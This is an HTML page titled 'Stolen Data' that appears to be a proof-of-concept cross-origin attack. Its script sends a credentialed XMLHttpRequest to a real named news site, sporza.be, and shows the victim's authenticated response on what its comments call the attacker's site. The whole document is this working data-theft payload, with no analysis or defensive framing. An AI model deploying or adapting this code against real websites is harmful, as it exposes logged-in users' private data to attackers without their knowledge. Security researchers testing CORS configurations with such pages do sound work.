<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stolen Data</title>
</head>
<body>
    <h1>Stolen Data from Victim Site</h1>
    <div id="stolen-data">
        <!-- Stolen data will appear here -->
    </div>

    <script>
        // Create an XMLHttpRequest object to make a request to the vulnerable site
        var xhr = new XMLHttpRequest();
        
        // Open a GET request to the target URL on the victim site
        xhr.open('GET', 'https://sporza.be/nl/', true);
        
        // Set withCredentials to include cookies and authentication tokens
        xhr.withCredentials = true;
        
        // Handle the response
        xhr.onload = function() {
            if (xhr.status === 200) {
                // Get the response text (stolen data)
                var stolenData = xhr.responseText;
                
                // Display the stolen data directly on the attacker's site
                document.getElementById('stolen-data').innerText = stolenData;
            } else {
                document.getElementById('stolen-data').innerText = 
                    'Failed to fetch data. Status: ' + xhr.status + ' (' + xhr.statusText + ')';
            }
        };
        
        // Handle errors
        xhr.onerror = function() {
            document.getElementById('stolen-data').innerText = 'Error occurred while fetching data.';
        };

        // Send the request
        xhr.send();
    </script>
</body>
</html>
